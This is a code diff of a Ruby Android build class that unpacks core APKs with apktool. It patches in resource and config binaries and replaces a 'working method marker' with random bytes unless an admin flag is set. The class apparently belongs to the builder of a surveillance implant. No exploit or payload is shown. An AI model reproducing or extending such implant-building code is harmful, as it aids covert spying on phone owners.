@@ -22,9 +22,9 @@ class BuildAndroid < Build
 
     apktool = path('apktool.jar')
     Dir[path('core.*.apk')].each do |d| 
-      trace :debug, "unpack: #{d}" 
+      #trace :debug, "unpack: #{d}"
       version = d.scan(/core.android.(.*).apk/).flatten.first		
-      trace :debug, "version: #{version}"
+      #trace :debug, "version: #{version}"
 
       CrossPlatform.exec "java", "-jar #{apktool} d #{d} #{@tmpdir}/apk.#{version}"
       
@@ -37,7 +37,6 @@ class BuildAndroid < Build
   end
 
   def patch(params)
-
     trace :debug, "Build: patching: #{params}"
 
     # enforce demo flag accordingly to the license
@@ -45,30 +44,29 @@ class BuildAndroid < Build
     params['demo'] = LicenseManager.instance.can_build_platform :android, params['demo']
       
     Dir[path('core.*.apk')].each do |d| 
-      trace :debug, "patch: #{d}" 
+      #trace :debug, "patch: #{d}"
       version = d.scan(/core.android.(.*).apk/).flatten.first		
-      trace :debug, "version: #{version}"
+      #trace :debug, "version: #{version}"
       
       # add the file to be patched to the params
       # these params will be passed to the super
       params[:core] = "apk.#{version}/res/raw/resources.bin"
       params[:config] = "apk.#{version}/res/raw/config.bin"
-
+      
       # invoke the generic patch method with the new params
       super
-    end
-
-    patch_file(:file => params[:core]) do |content|
-      begin
-        method = params['admin'] ? 'IrXCtyrrDXMJEvOU' : SecureRandom.random_bytes(16)
-        content['IrXCtyrrDXMJEvOU'] = method
-      rescue
-        raise "Working method marker not found"
-      ensure
-        content
+      
+      patch_file(:file => params[:core]) do |content|
+        begin
+          method = params['admin'] ? 'IrXCtyrrDXMJEvOU' : SecureRandom.random_bytes(16)
+          content['IrXCtyrrDXMJEvOU'] = method
+        rescue
+          raise "Working method marker not found"
+        ensure
+          content
+        end
       end
     end
-
   end
 
   def melt(params)
